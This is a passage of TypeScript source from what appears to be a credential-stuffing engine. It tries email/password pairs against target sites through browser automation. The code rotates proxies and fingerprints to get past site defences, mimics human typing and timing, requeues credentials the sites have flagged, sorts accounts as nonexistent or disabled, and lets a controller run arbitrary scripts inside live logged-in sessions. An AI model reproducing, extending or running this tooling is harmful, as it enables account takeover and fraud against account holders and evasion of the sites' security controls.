  private _lockChain: Promise<void> = Promise.resolve();

  constructor(initial: number, log?: (level: "WARN" | "INFO", msg: string) => void) {
    this._max = Math.max(1, initial);
    this.log = log;
  }

  get max(): number { return this._max; }
  get activeCount(): number { return this.active; }

  setMax(n: number): void {
    this._max = Math.max(1, n);
    this.drain();
  }

  async acquire(): Promise<() => void> {
    // Promise-chain mutex: each caller chains onto the previous caller's
    // completion, guaranteeing sequential access to the critical section.
    let releaseMutex: () => void;
    const prev = this._lockChain;
    this._lockChain = new Promise<void>((resolve) => { releaseMutex = resolve; });
    await prev;

    const createSafeRelease = () => {
      let released = false;
      return () => {
        if (released) return;
        released = true;
        this.release();
      };
    };

    try {
      if (this.active < this._max) {
        this.active++;
        releaseMutex!();
        return createSafeRelease();
      }
      return new Promise<() => void>((resolve) => {
        this.waiters.push(() => {
          this.active++;
          releaseMutex!();
          resolve(createSafeRelease());
        });
      });
    } catch (e) {
      releaseMutex!();
      throw e;
    }
  }

  private release(): void {
    if (this.active <= 0) {
      // Underflow guard — log warning and ensure clean non-negative state
      this.log?.("WARN", "DynamicLimit: release() called with active=0");
      this.active = 0;
      this.drain();
      return;
    }
    this.active--;
    this.drain();
  }

  private drain(): void {
    while (this.active < this._max && this.waiters.length > 0) {
      const w = this.waiters.shift()!;
      w();
    }
  }

  /** Unblock all queued acquirers so callers reach their shouldStop branch and
   *  exit cleanly. Each waiter does the same active++ / resolve(release) work
   *  it would have done if a slot freed naturally. */
  shutdown(): void {
    while (this.waiters.length > 0) {
      const w = this.waiters.shift()!;
      w();
    }
  }
}

// ─── Engine ───────────────────────────────────────────────────────────────────

export class AutomationEngine extends EventEmitter {
  private running = false;
  public isPaused = false;
  private shouldStop = false;
  public config!: EngineConfig;
  private rows: RowStatus[] = [];
  public lastOutcomeTime: number = Date.now();

  // Live-tunable concurrency: when set, suppresses the auto-throttler so the
  // dashboard's manual override wins over warmup/failure-rate adjustments.
  private liveLimit: DynamicLimit | null = null;
  private manualConcurrency: number | null = null;
  // Input mode — operator-facing toggle with exactly two options:
  //   "instant"    → page.fill() for both fields. No clear-and-type, no
  //                  per-keystroke delay. Field is set atomically.
  //   "fast-human" → real keystroke simulation at a fast-but-human cadence
  //                  (KEYSTROKE_DELAY_FAST = 35 ms per char).
  // Pacing (slowMo, in-page sleeps) is always "fast" — the speed/normal
  // axis was collapsed; "fast-human" still uses paceFactor=0.4 and slowMo=0.
  // Default is fast-human so the dashboard's default-on-load behaviour
  // matches the live-test path 1:1 — no surprise mode flips when an operator
  // promotes a green live-tested credential into a batch run.
  private inputMode: "instant" | "fast-human" | "chrome-autofill" = "instant";
  private lastBackend?: string;
  // Captured from EngineConfig at start() so persistence helpers can route
  // writes to the live-test sidecar files instead of the batch files (B1).
  private shouldMaskEmails: boolean = false;
  private _screenshotSvc: ScreenshotService;
  private _flowScreenshotter: FlowScreenshotter = new FlowScreenshotter();
  private readonly screenshotRelays: Array<{ event: "screenshot" | "screenshot-error" | "gcs-uploaded"; handler: (data: any) => void }> = [];
  /** Consecutive screenshot failure counter. Resets to 0 on any success.
   *  When this reaches SCREENSHOT_FAIL_THRESHOLD (4) AND no recording is
   *  active for the current row, the engine aborts that credential run. */
  private _consecutiveScreenshotFails = 0;
  private static readonly SCREENSHOT_FAIL_THRESHOLD = 4;
  private currentEmail?: string;
  private currentTarget?: string;
  // ── Hermes CDP Intervention: live session map ──
  // Tracks active Playwright Page instances by email so Hermes can reach into
  // live sessions via IPC → server → engine.executeOnLiveSession().
  private _liveSessions: Map<string, import("playwright-core").Page> = new Map();
  // ── VIP Warm Pool ──
  // High-trust sessions kept alive after a flawless login to route the next VIP credential through.
  private _vipWarmPool: SessionHandle[] = [];
  // Rows that hit an UPDATE YOUR PIN / repeat LOGIN VERIFICATION misdirection and
  // need to be retested with a fresh fingerprint+IP. Drained once after the
  // initial credential pass completes; bounded to one requeue per row so a
  // persistently-targeted credential can't spin forever.
  private requeuedRowIndexes: Set<number> = new Set();
  // Emails whose requeue is pending across restarts — mirrors requeuedRowIndexes
  // but keyed by email since indexes don't survive a CSV reload. Persisted to
  // REQUEUE_PENDING_FILE at the same moments the misdirection denylist is saved.
  private requeuedPendingEmails: Set<string> = new Set();
  // Bound healthMonitor "profile-unhealthy" handler. Tracked here so a
  // subsequent engine.start() can detach the previous binding before
  // re-attaching, preventing duplicate WARN logs every health-check tick.
  // AI verification: rows that hit all-terminal-bad and have recordings
  // get queued for post-run AI verification instead of immediate denylist burn.
  private pendingVerifications: VerificationJob[] = [];
  private verificationEnabled: boolean = false;
  private runStartTime: number = 0;
  /** DB-backed per-site TEMP_DISABLED requeue scheduler. Started with the engine. */
  private tempDisabledScheduler: TempDisabledScheduler | null = null;
  /** Darwin natural selection engine instance for multi-candidate optimization */
  private darwinEngine: DarwinEngine | null = null;
  private _darwinWinnerElected: boolean = false;
  constructor() {
    super();
    this._screenshotSvc = new ScreenshotService({
      baseDir: path.join(process.cwd(), DynamicTimings.SCREENSHOT_DIR),
      defaultFormat: DynamicTimings.SCREENSHOT_FORMAT,
      defaultQuality: DynamicTimings.SCREENSHOT_JPEG_QUALITY,
      retentionMs: DynamicTimings.SCREENSHOT_RETENTION_MS,
      cleanupIntervalMs: DynamicTimings.SCREENSHOT_CLEANUP_INTERVAL_MS,
      emitBase64: true, // For dashboard relay
      logger: (level, msg) => this.log(level, msg),
    });

    // Relay service events to engine consumers (dashboard). Keep bound
    // references so long-lived processes/tests can explicitly detach them.
    const screenshotHandler = (data: any) => {
      this.emit("screenshot", data);
    };
    const screenshotErrorHandler = (data: any) => {
      this.emit("screenshot-error", data);
    };
    const gcsUploadedHandler = (data: any) => {
      this.emit("gcs-uploaded", data);
    };
    this.screenshotRelays.push(
      { event: "screenshot", handler: screenshotHandler },
      { event: "screenshot-error", handler: screenshotErrorHandler },
      { event: "gcs-uploaded", handler: gcsUploadedHandler },
    );
    for (const { event, handler } of this.screenshotRelays) {
      this._screenshotSvc.on(event, handler);
    }

    // Re-hydrate proxy reputation from disk so quarantined proxies stay
    // quarantined across restarts. No-op if the sidecar file is absent.
    proxyScoreTracker.loadScores(PROXY_SCORES_FILE).catch(e => this.log("WARN", `Failed to load proxy scores: ${e}`));
    // Re-hydrate the misdirection denylist so burned seeds/proxies stay
    // burned across restarts.
    misdirectionDenylist.load(MISDIRECTION_DENYLIST_FILE);
    // Re-hydrate the email denylist so permanently-disabled accounts (and
    // operator-curated dead-account seeds) stay excluded across restarts.
    emailDenylist.loadAll(DEFAULT_TARGETS.map((s: any) => s.name));
    // Re-hydrate the pending-requeue list so a credential burned-and-requeued
    // just before a crash still gets its retest on the next run.
    this.loadRequeuePending(REQUEUE_PENDING_FILE);
  }

  /** Persist the pending-requeue email set. Safe to call frequently; uses an
   *  atomic rename so a partial write can't corrupt the file. Falls back to
   *  direct write on Windows where rename can fail. */
  private async saveRequeuePending(file: string): Promise<void> {
    try {
      const tmp = `${file}.tmp`;
      const data = JSON.stringify({ emails: Array.from(this.requeuedPendingEmails) }, null, 2);
      try {
        await fs.promises.writeFile(tmp, data, "utf-8");
        fs.renameSync(tmp, file);
      } catch {
        // Rename failed (Windows) — fall back to direct write
        await fs.promises.writeFile(file, data, "utf-8");
        try { fs.unlinkSync(tmp); } catch { /* ignore */ }
      }
    } catch (e: unknown) {
      this.log("WARN", `requeue-pending save failed: ${(e instanceof Error ? e.message : String(e)) || e}`);
    }
  }

  /** Load the pending-requeue email set on engine construction. Silently
   *  skips a missing or corrupt file; the engine just won't requeue anything
   *  it didn't see during the current run. */
  private loadRequeuePending(file: string): void {
    try {
      if (!fs.existsSync(file)) return;
      const raw = fs.readFileSync(file, "utf-8");
      const parsed = JSON.parse(raw);
      if (parsed && Array.isArray(parsed.emails)) {
        for (const e of parsed.emails) {
          if (typeof e === "string" && e.length > 0) this.requeuedPendingEmails.add(e);
        }
      }
    } catch { /* corrupted — start fresh */ }
  }

  get screenshotSvc(): ScreenshotService {
    return this._screenshotSvc;
  }

  cleanup(): void {
    this._screenshotSvc.stopAutoPrune();
    for (const { event, handler } of this.screenshotRelays) {
      this._screenshotSvc.off(event, handler);
    }
    this.screenshotRelays.length = 0;
  }

  get isRunning(): boolean {
    return this.running;
  }

  setPaused(paused: boolean): void {
    if (this.isPaused !== paused) {
      this.isPaused = paused;
      this.log("INFO", `[Engine] Execution ${paused ? "PAUSED ⏸" : "RESUMED ▶"}`);
    }
  }

  get currentConcurrency(): number {
    return this.liveLimit?.max ?? this.manualConcurrency ?? 0;
  }

  /** Live-update concurrency from outside (dashboard control). Pins manual
   *  override so the auto-throttler stops adjusting while a manual value is set. */
  setConcurrency(n: number, backend?: string): number {
    const currentBackend = backend || this.lastBackend;
    const maxConcurrency = getMaxConcurrencyForBackend(currentBackend);
    const clamped = Math.min(Math.max(Math.floor(n), 1), maxConcurrency);
    if (n > maxConcurrency) {
      this.log("WARN", `Requested concurrency ${n} exceeds recommended safe limit of ${maxConcurrency} for backend '${currentBackend}'. Capped at ${maxConcurrency}.`);
    }
    this.manualConcurrency = clamped;
    if (this.liveLimit) {
      const prev = this.liveLimit.max;
      this.liveLimit.setMax(clamped);
      if (prev !== clamped) {
        this.log("INFO", `⚙ Concurrency manually set ${prev} → ${clamped} (auto-throttler suspended)`);
      }
    }
    return clamped;
  }

  /** Release the manual override and hand control back to the auto-throttler.
   *  liveLimit.max is intentionally left untouched — the next recordRowOutcome
   *  invocation is the first one allowed to adjust it, so the operator doesn't
   *  see a jarring jump at the moment the pin is released. */
  resetConcurrencyToAuto(): void {
    const prev = this.manualConcurrency;
    this.manualConcurrency = null;
    this.log("INFO", `⚙ Concurrency returned to auto-throttler (was pinned at ${prev ?? "auto"})`);
  }

  get currentInputMode(): "instant" | "fast-human" | "chrome-autofill" { return this.inputMode; }

  /** Backwards-compatible alias. Older callers asked for currentSpeedMode;
   *  we collapsed the toggle so this always reports the single fast pacing. */
  get currentSpeedMode(): "fast" { return "fast"; }

  setInputMode(m: "instant" | "fast-human" | "chrome-autofill"): "instant" | "fast-human" | "chrome-autofill" {
    if (this.inputMode !== m) {
      this.inputMode = m;
      this.log("INFO", `⌨ Input mode → ${m}`);
    }
    return this.inputMode;
  }

  /** No-op shim retained for legacy WebSocket message handlers; the speed axis
   *  has been collapsed into the single fast pacing. Returns the canonical
   *  current value so the dashboard's response payload stays consistent. */
  setSpeedMode(_m: "fast" | "normal"): "fast" { return "fast"; }

  // ── Hermes CDP Live Intervention ──────────────────────────────────────────
  /** Register a live page for a credential email so Hermes can intervene. */
  registerLiveSession(email: string, page: import("playwright-core").Page): void {
    this._liveSessions.set(email.toLowerCase(), page);
  }
  /** Unregister a live session when the credential run completes. */
  unregisterLiveSession(email: string): void {
    this._liveSessions.delete(email.toLowerCase());
  }
  /** Get all currently active session emails. */
  get liveSessionEmails(): string[] {
    return Array.from(this._liveSessions.keys());
  }
  /**
   * Execute an action on a live session. Called by server.ts in response to
   * Hermes IPC `cdp_execute` messages.
   * @returns result object or null if session not found.
   */
  async executeOnLiveSession(email: string, action: {
    type: "evaluate" | "click" | "screenshot" | "reload" | "get_url" | "get_content";
    selector?: string;
    script?: string;
  }): Promise<{ success: boolean; data?: any; error?: string }> {
    const page = this._liveSessions.get(email.toLowerCase());
    if (!page) return { success: false, error: `No live session for ${email}` };
    try {
      switch (action.type) {
        case "evaluate": {
          if (!action.script) return { success: false, error: "No script provided" };
          const result = await page.evaluate(action.script).catch((e: any) => ({ __error: e.message }));
          return { success: true, data: result };
        }
        case "click": {
          if (!action.selector) return { success: false, error: "No selector provided" };
          await page.click(action.selector, { timeout: 5000 });
          return { success: true };
        }
        case "screenshot": {
          const buf = await page.screenshot({ type: "jpeg", quality: 60 });
          return { success: true, data: buf.toString("base64").slice(0, 500) + "..." };
        }
        case "reload": {
          await page.reload({ waitUntil: "domcontentloaded", timeout: 15000 });
          return { success: true };
        }
        case "get_url": {
          return { success: true, data: page.url() };
        }
        case "get_content": {
          const text = await page.evaluate(SHADOW_DOM_TEXT_EXTRACTOR).catch(() => "");
          const title = await page.title().catch(() => "");
          return { success: true, data: { title, text } };
        }
        default:
          return { success: false, error: `Unknown action type: ${String(action.type)}` };
      }
    } catch (e: unknown) {
      this.log("WARN", `[Hermes-CDP] executeOnLiveSession error for ${email}: ${e instanceof Error ? e.message : String(e)}`);
      return { success: false, error: (e instanceof Error ? e.message : String(e)) };
    }
  }

  /** Multiplier applied to in-page pacing sleeps (post-fill, pre-click, etc).
   *  Hardcoded fast since the speed/normal axis was retired. */
  private get paceFactor(): number { return 0.4; }

  /** Playwright slowMo passed to backend. Always 0 — snappy actions only. */
  private get slowMoMs(): number { return 0; }

  /** Speed-scaled sleep — used inside the login flow only. Stagger / cleanup
   *  timeouts continue to use this.sleep() directly so they're not shortened.
   *  Now uses Gaussian variance + time-of-day multiplier for human realism. */
  private pace(ms: number): Promise<void> {
    const todMultiplier = getTimeOfDayMultiplier();
    const base = ms * this.paceFactor * todMultiplier;
    const jittered = gaussianClamped(base, base * 0.2, base * 0.5, base * 2.0);
    return this.sleep(Math.round(jittered));
  }

  /** Imp #13: Email masking for privacy */
  private formatEmail(email: string): string {
    if (!this.shouldMaskEmails) return email;
    const [user, domain] = email.split("@");
    if (!domain) return email;
    const maskedUser = user!.length > 2 ? user!.substring(0, 2) + "***" : user + "***";
    const maskedDomain = domain.length > 4 ? domain.substring(0, 2) + "***" + domain.substring(domain.lastIndexOf(".")) : domain;
    return `${maskedUser}@${maskedDomain}`;
  }

  /** Strip user:pass@ from a proxy URL for logging. Keeps host:port visible
   *  so operators can correlate failures to a specific proxy, but drops the
   *  basic-auth credentials so log scraping doesn't leak them. */
  private maskProxyCreds(url: string): string {
    try {
      const u = new URL(url);
      const port = u.port ? `:${u.port}` : "";
      return `${u.protocol}//${u.hostname}${port}`;
    } catch {
      return url.replace(/\/\/[^@]*@/, "//");
    }
  }

  /**
   * Called after a row has finished all target sites.
   * 1. Queues the row's recording for AI Verification (if enabled).
   * 2. If verification is disabled, falls back to the old behavior of immediately
   *    burning the email on the denylist if all sites ended in terminal failure.
   */
  private async finalizeRowProcessing(idx: number, targets: SiteConfig[]): Promise<void> {
    const TERMINAL_BAD: ReadonlySet<Outcome> = new Set(["permdisabled", "noaccount"]);
    const row = this.rows[idx];
    if (!row || !row.email) return;
    // Require at least one tested site.
    if (targets.length === 0) return;

    let allTerminalBad = true;
    let allNoAccount = true;
    const summary: string[] = [];
    for (const t of targets) {
      const s = row.sites[t.name];
      if (!s || !TERMINAL_BAD.has(s.outcome)) allTerminalBad = false;
      if (!s || s.outcome !== "noaccount") allNoAccount = false;
      if (s) summary.push(`${t.name}=${s.outcome}`);
    }

    // Queue for AI verification if enabled and we have a recording.
    // New rule: Verify every single run app-wide that wasn't detected as a noaccount.
    const recordingPath = this.resolveRecordingPath(row);
    if (this.verificationEnabled && recordingPath && !allNoAccount) {
      const job: VerificationJob = {
        email: row.email,
        rowIndex: idx,
        autoBurnCandidate: allTerminalBad,
        // @ts-expect-error noUncheckedIndexedAccess
        sites: summary.map(s => {
          const [name, outcome] = s.split("=");
          return { name, engineOutcome: outcome, videoPath: recordingPath };
        }),
      };
      if (job.sites.length > 0) {
        this.pendingVerifications.push(job);
        this.log("INFO", `  🤖 ${row.email} queued for AI verification (${summary.join(",")})`);
        return; // defer denylist evaluation until verification completes
      }
    }

    // Only auto-burn if every site was terminal bad
    if (allTerminalBad) {
      for (const targetName of Object.keys(row.sites)) {
        if (emailDenylist.add(row.email, targetName, "all-terminal-bad")) {
          // Saving happens globally now or per site
        }
      }
      await emailDenylist.saveAll();
      this.log("WARN", `  🔒 ${row.email} added to email denylists for all sites via all-terminal-bad rule`);
    }
  }

  /** Resolve a RowStatus's recordingUrl to an absolute local file path, or pass through remote URLs.
   *  Returns null for missing files. */
  private resolveRecordingPath(row: RowStatus): string | null {
    if (!row.recordingUrl) return null;
    // Allow remote URLs (Spider cloud) to pass through to ffmpeg
    if (/^https?:\/\//i.test(row.recordingUrl)) return row.recordingUrl;
    const abs = path.resolve(process.cwd(), row.recordingUrl);
    return fs.existsSync(abs) ? abs : null;
  }

  /** Process pending AI verifications after the main run completes.
   *  Burns verified outcomes to denylist; flags disputed ones for manual review. */
  private async runVerificationQueue(_targets: SiteConfig[]): Promise<void> {
    const jobsToProcess = this.pendingVerifications.splice(0, this.pendingVerifications.length);
    this.log("INFO", `🤖 Processing ${jobsToProcess.length} AI verification(s)...`);

    for (const job of jobsToProcess) {
      try {
        const results = await processVerificationJob(job);
        const row = this.rows[job.rowIndex];
        if (!row) continue;

        // Store AI results on the row
        const siteResults: RowStatus["aiVerified"] = {
          verified: true,
          siteResults: {},
        };
        let allMatch = true;
        let anySignalMissing = false;
        const missingSignalSites: string[] = [];
        for (const [siteName, result] of results) {
          siteResults.siteResults[siteName] = {
            aiVerdict: result.aiVerdict,
            confidence: result.confidence,
            matches: result.matches,
            reasoning: result.reasoning,
          };
          if (!result.matches) allMatch = false;
          if (!result.signalAvailable) {
            anySignalMissing = true;
            missingSignalSites.push(siteName);
          }
        }
        row.aiVerified = siteResults;
        this.triggerRowUpdate(job.rowIndex);
        this.emit("ai-verification", {
          email: job.email,
          rowIndex: job.rowIndex,
          allMatch,
          siteResults: siteResults.siteResults,
        });

        if (anySignalMissing) {
          this.log("WARN", `  🤖 ${job.email} — AI signal unavailable for [${missingSignalSites.join(", ")}], NOT denylisted. Will be retried.`);
        } else if (allMatch) {
          const summary = job.sites.map(s => `${s.name}=${s.engineOutcome}`).join(",");
          if (job.autoBurnCandidate) {
            const reason = `all-terminal-bad:${summary} [ai-verified]`;
            let addedAny = false;
            for (const t of job.sites) {
              if (emailDenylist.add(row.email, t.name, reason)) addedAny = true;
            }
            if (addedAny) {
              await emailDenylist.saveAll();
              this.log("WARN", `  🔒🤖 ${row.email} added to email denylist for all sites — AI VERIFIED (${summary})`);
            }
          } else {
            this.log("INFO", `  🤖 ${row.email} — AI VERIFIED non-terminal outcome (${summary})`);
          }
        } else {
          this.log("WARN", `  ⚠️🤖 ${row.email} — AI DISPUTED engine outcome, NOT denylisted. Manual review required.`);
        }

        // Cleanup screenshots for sites that reached a definitive outcome
        const DEFINITIVE_OUTCOMES: ReadonlySet<string> = new Set<string>(CONFIDENT_OUTCOMES);
        for (const [siteName, result] of results) {
          // If AI confirms a definitive outcome, or engine had one and AI agreed, cleanup
          const finalOutcome = result.matches ? job.sites.find(s => s.name === siteName)?.engineOutcome : result.aiVerdict;
          if (finalOutcome && DEFINITIVE_OUTCOMES.has(finalOutcome)) {
            this.cleanupScreenshotsForSite(job.email, siteName);
          }
        }
      } catch (err: unknown) {
        // Verification framework itself crashed (not a per-site AI error —
        // those are swallowed inside processVerificationJob). Without a
        // real verdict we have no business burning the credential.
        this.log("WARN", `  🤖 Verification framework failed for ${job.email}: ${(err instanceof Error ? err.message : String(err)) || String(err)} — NOT denylisted (will be retried).`);
      }
    }

    this.log("INFO", `🤖 AI verification queue complete`);
  }

  /**
   * Scans the screenshots directory for a given credential and site, keeping only
   * the most recent screenshot (which represents the final definitive state) and
   * deleting all prior intermediate/warmup screenshots to save disk space.
   */
  private cleanupScreenshotsForSite(email: string, siteName: string) {
    const screenshotsDir = path.join(process.cwd(), "screenshots");
    if (!fs.existsSync(screenshotsDir)) return;

    try {
      const emailSafe = email.replace(/[@.]/g, "_");
      const prefix = `${emailSafe}__`;
      const siteMatch = `__${siteName}__`;

      const files = fs.readdirSync(screenshotsDir)
        .filter(f => f.startsWith(prefix) && f.includes(siteMatch) && f.endsWith(".jpeg"));

      if (files.length <= 1) return; // Nothing to clean up if 0 or 1 screenshot

      // Sort files by modification time (or creation time)
      const filesWithStats = files.map(f => {
        const fullPath = path.join(screenshotsDir, f);
        return { file: f, fullPath, mtime: fs.statSync(fullPath).mtimeMs };
      });

      filesWithStats.sort((a, b) => b.mtime - a.mtime); // Newest first

      // Keep the newest (index 0), delete the rest
      let deletedCount = 0;
      for (let i = 1; i < filesWithStats.length; i++) {
        const item = filesWithStats[i];
        if (!item) continue;
        try {
          fs.unlinkSync(item.fullPath);
          deletedCount++;

          // Also wipe the intermediate state from Google Cloud Storage
          if (this.screenshotSvc && (this.screenshotSvc as any)._gcsUploader) {
            (this.screenshotSvc as any)._gcsUploader.deleteByFilename(item.file).catch(() => { });
          }
        } catch {
          // ignore unlink errors (e.g. file locked or already deleted)
        }
      }
      if (deletedCount > 0) {
        this.log("INFO", `  🧹 Cleaned up ${deletedCount} intermediate screenshot(s) for ${email} / ${siteName}`);
      }
    } catch (err: unknown) {
      this.log("WARN", `  ⚠️ Failed to cleanup screenshots for ${email} / ${siteName}: ${(err instanceof Error ? err.message : String(err)) || String(err)}`);
    }
  }

  /** Wipe the pre-warmed static cache directory used by the cloak backend.
   *  Called after a fingerprinting misdirection burns the credential's
   *  current session — the cache may be carrying state the site has
   *  correlated with the burned fingerprint. Best-effort: failures are
   *  logged but never thrown.
   *
   *  When `scope` is supplied (proxyKey and/or fingerprintSeed), only the
   *  per-scope namespace directories under the cache root are wiped; the
   *  shared root template is left intact so concurrent peer sessions
   *  seeding from it aren't disrupted. When no scope is supplied the
   *  legacy whole-root wipe is performed (used by tests and one-shot
   *  manual resets). */
  private async wipeStaticCache(reason: string, scope?: StaticCacheScope): Promise<void> {
    if (scope && (scope.proxyKey || typeof scope.fingerprintSeed === "number")) {
      try {
        const { wiped } = await wipeStaticCacheNamespaces(scope);
        if (wiped.length > 0) {
          this.log("WARN", `  🧹 Static cache namespace wiped (${wiped.join(", ")}) — reason: ${reason}`);
        }
      } catch (e: unknown) {
        this.log("WARN", `  Static cache namespace wipe failed: ${(e instanceof Error ? e.message : String(e)) ?? String(e)}`);
      }
      return;
    }
    const dir = getStaticCacheDir();
    try {
      if (fs.existsSync(dir)) {
        await fs.promises.rm(dir, { recursive: true, force: true });
        this.log("WARN", `  🧹 Static cache wiped (${dir}) — reason: ${reason}`);
      }
    } catch (e: unknown) {
      this.log("WARN", `  Static cache wipe failed (${dir}): ${(e instanceof Error ? e.message : String(e)) ?? String(e)}`);
    }
  }

  /** Mark a row for requeue after the current pass completes.
   *  Resets per-site outcomes that aren't already terminal so the requeue
   *  pass retests them with a fresh fingerprint and IP.
   *  The one-requeue-per-run guard has been removed — multiple requeues are
   *  allowed so that different triggers (misdirection, proxy failure, etc.)
   *  can each independently schedule a retry. */
  private scheduleRequeue(idx: number, targets: SiteConfig[], trigger: string, currentBackend?: string): void {
    // Track requeue for backend-rotation bookkeeping (not as a block)
    this.requeuedRowIndexes.add(idx);
    const row = this.rows[idx];
    if (!row) return;

    if (this.config && this.config.rotateBackendsList && this.config.rotateBackendsList.length > 1) {
      const alt = this.pickAlternateBackend(this.config, currentBackend || this.config.backend);
      (this.rows[idx] as any).__backendOverride = alt;
      this.log("INFO", `  🔄 [RotateBackend] ${row.email}: switching to ${alt} for retry (${trigger})`);
    } else if (this.config && this.config.rotateOnFingerprint && currentBackend) {
      const alt = this.pickAlternateBackend(this.config, currentBackend);
      (this.rows[idx] as any).__backendOverride = alt;
      this.log("INFO", `  🔄 [RotateOnFP] ${row.email}: switching to ${alt} for retry (${trigger})`);
    }

    // Persist the requeue marker by email so it survives a crash between the
    // denylist save and the run completion. The caller (the burn site below)
    // is responsible for invoking saveRequeuePending in the SAME code path
    // that calls misdirectionDenylist.save so the two stay coherent.
    if (row.email) this.requeuedPendingEmails.add(row.email);
    for (const t of targets) {
      const s = row.sites[t.name];
      if (!s) continue;
      if (s.outcome === "N/A" || s.outcome === "testing" || s.outcome === "queued") {
        s.outcome = "queued";
        s.attempts = 0;
        s.error = `requeued:${trigger}`;
      }
    }
    row.status = "queued";
    this.log("WARN", `  ↩ ${row.email}: scheduled for requeue (trigger=${trigger})`);
  }
  private async executeFlowStep<T>(
    stepName: string,
    codebaseLocation: string,
    action: () => Promise<T>,
    context?: { email: string; site: string; sessionId: string }
  ): Promise<T> {
    if (context) {
      flowTracer.recordEvent({
        type: "step_start",
        session_id: context.sessionId,
        email: context.email,
        site: context.site,
        message: `Starting: ${stepName}`,
        details: { location: codebaseLocation }
      });
    }

    if (!this.config?.flowDebug) return action();

    engineLog.thought("Orchestrator", `Preparing to execute automation step: ${stepName} at ${codebaseLocation}`);
    this.log("DEBUG", `[FLOW DEBUG] ⏳ Starting: ${stepName} (${codebaseLocation})`);
    try {
      const result = await action();
      engineLog.thought("Orchestrator", `Successfully completed step: ${stepName}`);
      this.log("DEBUG", `[FLOW DEBUG] ✅ Completed: ${stepName}`);

      if (context) {
        flowTracer.recordEvent({
          type: "step_end",
          session_id: context.sessionId,
          email: context.email,
          site: context.site,
          message: `Completed: ${stepName}`,
          details: { result: typeof result === 'object' ? 'object' : result }
        });
      }

      return result;
    } catch (e: unknown) {
      this.log("ERR", `[FLOW DEBUG] ❌ HALT: Step failed - ${stepName}`);
      this.log("ERR", `[FLOW DEBUG] 📍 Location: ${codebaseLocation}`);
      this.log("ERR", `[FLOW DEBUG] 📄 Reason: ${e instanceof Error ? e.message : String(e)}`);

      if (context) {
        flowTracer.recordEvent({
          type: "step_error",
          session_id: context.sessionId,
          email: context.email,
          site: context.site,
          message: `Failed: ${stepName}`,
          details: { error: (e instanceof Error ? e.message : String(e)), location: codebaseLocation }
        });
      }

      throw e;
    }
  }

  private async repairCredentialField(
    driver: CredentialFieldDriver,
    selector: string,
    value: string,
  ): Promise<boolean> {
    if (await driver.readValue(selector) === value) return true;

    for (const step of driver.repairPlan(value)) {
      await step.run(selector);
      if (driver.shouldAbort && await driver.shouldAbort()) return false;
      if (await driver.readValue(selector) === value) return true;
    }
    return false;
  }

  /** Mode-aware text input. Autofill (default) triple-clicks to select-all,
   *  then fills — this guarantees the old value is fully replaced even on
   *  reactive (React/Vue) controlled inputs that reset the field after each
   *  "incorrect" response. Keyboard mode adds per-keystroke delays for
   *  human-like visible typing in headed debug runs.
   *
   *  Returns true when a verify-and-repair read-back confirms the field
   *  ended up holding the requested value. Returns false when, after every
   *  escalation pass, the field still mismatches — callers handling
   *  credential entry should treat false as a signal to ABORT the submit
   *  for this attempt rather than send a known-wrong password (which
   *  pollutes noaccount classification and burns the attempt budget). */
  private async inputText(page: Page, selector: string, value: string): Promise<boolean> {
    const rawLoc = page.locator(selector);
    const loc = typeof (rawLoc as any)?.first === "function" ? (rawLoc as any).first() : rawLoc;
    const current = await loc.inputValue({ timeout: 50 }).catch(() => undefined);
    if (current === value) return true;

    let actual: string | undefined = undefined;
    try {
      await loc.click({ force: true, timeout: 1000 }).catch(() => {});
      await page.keyboard.press(process.platform === "darwin" ? "Meta+A" : "Control+A").catch(() => {});
      await page.keyboard.press("Backspace").catch(() => {});
      await loc.fill(value, { force: true, timeout: 3000 });
    } catch { }

    // Fast polling verify
    for (let i = 0; i < 3; i++) {
      if (i > 0) await this.sleep(5);
      // Abort if the page has already pivoted to a known terminal state (like Ignition verification)
      const inPageVerdict = await page.evaluate?.(() => {
        const STATUS_SYM = Symbol.for("cloak_status");
        return (window as any)[STATUS_SYM] ?? null;
      }).catch(() => null) ?? null;
      if (inPageVerdict === "ignition-verification") return false;

      actual = await page.locator(selector).inputValue({ timeout: 50 }).catch(() => undefined);
      if (actual === value) break;
    }

    if (actual !== value) {
      await page.locator(selector).type(value, { delay: Math.floor(Math.random() * 30), timeout: 3000 }).catch(() => { });
      for (let i = 0; i < 3; i++) {
        if (i > 0) await this.sleep(5);
        const inPageVerdict = await page.evaluate?.(() => {
          const STATUS_SYM = Symbol.for("cloak_status");
          return (window as any)[STATUS_SYM] ?? null;
        }).catch(() => null) ?? null;
        if (inPageVerdict === "ignition-verification") return false;

        actual = await page.locator(selector).inputValue({ timeout: 50 }).catch(() => undefined);
        if (actual === value) break;
      }
    }

    if (actual !== undefined && actual !== value) {
      const locator: any = page.locator(selector);
      if (typeof locator.clear === "function") await locator.clear({ timeout: 150 }).catch(() => { });
      await page.locator(selector).type(value, { delay: Math.floor(Math.random() * 30), timeout: 3000 }).catch(() => { });
      await this.sleep(10);
      actual = await page.locator(selector).inputValue({ timeout: 50 }).catch(() => undefined);
    }

    if (actual !== undefined && actual !== value) {
      this.log("WARN", `  ⚠ instant input drift persisted on ${selector}: expected ${value.length} chars, got ${actual?.length ?? "?"} — proceeding anyway`);
      return false;
    }

    // Ensure SPA frameworks (React/Vue) synchronize internal form state
    await page.evaluate((sel) => {
      const el = document.querySelector(sel);
      if (el) {
        el.dispatchEvent(new Event('input', { bubbles: true }));
        el.dispatchEvent(new Event('change', { bubbles: true }));
        el.dispatchEvent(new Event('blur', { bubbles: true }));
      }
    }, selector).catch(() => {});

    // ── Verify-and-repair ──────────────────────────────────────────────────
    const driver: CredentialFieldDriver = {
      readValue: async (sel: string) => {
        let actual: string | undefined;
        for (let i = 0; i < 4; i++) {
          if (i > 0) await this.sleep(30);
          actual = await page.locator(sel).inputValue().catch(() => undefined);
          if (actual === undefined || actual === value) break;
        }
        return actual;
      },
      repairPlan: (val: string) => [
        {
          run: async (sel: string) => {
            this.log("WARN", `  ⚠ inputText drift on ${sel} — escalating directly to brute-force repair`);
            const repairLocator: any = page.locator(sel);
            if (typeof repairLocator.clear === "function") await repairLocator.clear({ timeout: 1000 }).catch(() => { });
            await page.locator(sel).type(val, { delay: Math.floor(Math.random() * 30), timeout: 3000 }).catch(() => { });
            await this.sleep(100);
          }
        }
      ],
      // eslint-disable-next-line @typescript-eslint/require-await
      shouldAbort: async () => false
    };

    const success = await this.repairCredentialField(driver, selector, value);
    if (!success) {
      this.log("WARN", `  ⚠ inputText drift persisted after brute-force passes on ${selector} — caller must abort submit`);
    }
    return success;
  }

  get rowStatuses(): RowStatus[] {
    return this.rows;
  }

  /**
